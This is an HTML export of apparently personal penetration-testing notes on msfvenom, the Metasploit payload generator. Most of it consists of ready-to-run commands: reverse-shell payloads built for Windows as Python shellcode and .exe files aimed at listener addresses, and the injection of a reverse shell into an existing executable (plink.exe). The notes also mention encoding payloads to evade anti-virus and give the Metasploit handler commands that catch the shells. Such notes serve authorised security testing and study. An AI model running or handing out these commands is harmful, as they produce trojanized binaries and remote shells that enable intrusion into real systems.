<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>msfvenom</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># msfvenom</h1></strong><br /><a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom">https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom</a><br /><br /><code>msfvenom</code> is arguably part of Metasploit.<br />It&#39;s a combination of the old <code>msfpayload</code> and <code>msfencode</code> tools.<br />It can generate:<br />• Payloads in various formats<br />• Encoded payloads using various encoders (to evade anti-virus)<br /><br /><code>-h</code> = help<br /><code>-p &lt;payload&gt;</code> = payload<br /><code>-f &lt;format&gt;</code> = output format<br /><code>-a</code> = architecture<br /><code>--platform</code> = for which platform<br /><code>-c</code> = how many times to encode payload<br /><code>-b</code> = bad characters<br /><code>-o &lt;name&gt;</code> = save payload as<br /><code>--help-formats</code> = list available formats you can save payload as<br /><code>msfvenom --list platforms</code> - list platforms<br /><br /><strong><h2>## Find Payloads</h2></strong><br /><code>msfvenom --list payloads</code><br /><code>msfvenom --list payloads | grep windows/shell</code> - find a payload<br /><code>msfvenom -p windows/shell/reverse_tcp --list-options</code> - list payload options<br /><code>/usr/share/metasploit-framework/tools/modules/payload_lengths.rb | awk &#39;$2&lt;=247&#39; | grep windows</code> - Find payload of certain length<br /><br /><strong><h3>### Useful Payloads</h3></strong><br /><code>linux/x86/exec</code> - Local linux, 32-bit, execute a commnd (like /bin/sh)<br /><code>linux/x64/exec</code> - Local linux, 64-bit, execute a command (like /bin/sh)<br /><br /><strong><h2>## Generate</h2></strong><br />Python - meterpreter reverse_tcp<br /><code>msfvenom -a x86 --platform Windows -p windows/shell/reverse_tcp LHOST=192.168.1.170 LPORT=4444 -b &#39;\x00\x0A\x0D&#39; -f python</code><br /><br />Reverse TCP as .exe<br /><code>msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.1.170 LPORT=4444 -f exe -o shell_reverse_tcp_msf.exe</code><br /><br />Reverse TCP x64 as .exe<br /><code>msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=192.168.1.73 LPORT=443 -f exe -o binary.exe</code><br /><br />Inject payload into an existing windows PE executable<br /><code>msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.1.170 LPORT=4444 -x /usr/share/windows-binaries/plink.exe -o plink-shell_reverse_tcp.exe -f exe</code><br /><br /><strong><h2>## Receive</h2></strong><code><br />use exploit/multi/handler<br />set payload windows/meterpreter/reverse_tcp</code> - set to the payload the same as you generated<code><br />show options</code> - set the options it requires<code><br />run</code></div>
</body>
</html>
